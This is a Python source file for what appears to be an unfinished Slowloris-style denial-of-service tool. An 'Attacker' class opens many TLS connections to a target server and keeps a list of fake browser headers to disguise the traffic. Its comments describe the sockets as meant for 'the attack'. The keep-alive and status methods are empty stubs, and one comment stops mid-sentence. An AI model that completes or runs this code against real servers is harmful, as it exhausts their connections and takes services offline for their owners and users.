import socket
import ssl


class Attacker:
    def __init__(self, target, numSockets):
        self.target = target
        self.port = 80
        self.socketCount = numSockets

        self.sockets = []



        self.fakeHeaderList = [
            [
                "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/55.0.2919.83 Safari/537.36",
                "Accept-language: ru,q=0.5",
                "Connection: Keep-Alive"
            ]
            , [
                "User-agent: Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                "Accept-language: ro,q=0.5",
                "Connection:Keep-Alive"
            ],
            [
                "User-agent: Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16)",
                "Accept-language: vi, q=0.5",
                "Connection: Keep-alive"
            ]

        ]
    #This method creates the sockets that will be used in the attack
    def createSocket(self):

        #This needs to be changed to enable HTTPS connections, this implementation is currently
        loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        loris = ssl.wrap_socket(loris, ssl_version=ssl.PROTOCOL_SSLv23)

        loris.connect((self.target, 443))

        self.sockets.append(loris)

       # req = "GET / HTTP/1.1\nHost: "+self.target+"\r\n\r\n"

        #loris.send(req.encode())


       # info = loris.recv(10000)


        #print(info.decode("utf8"))

    #Create all the sockets that will be used in the attack
    def createAllSockets(self):
        for i in range (0,self.socketCount):
            self.createSocket()

    def attackTarget(self):
        self.createAllSockets()


    def stayAlive(self):
        pass

    def printStatus(self):
        pass
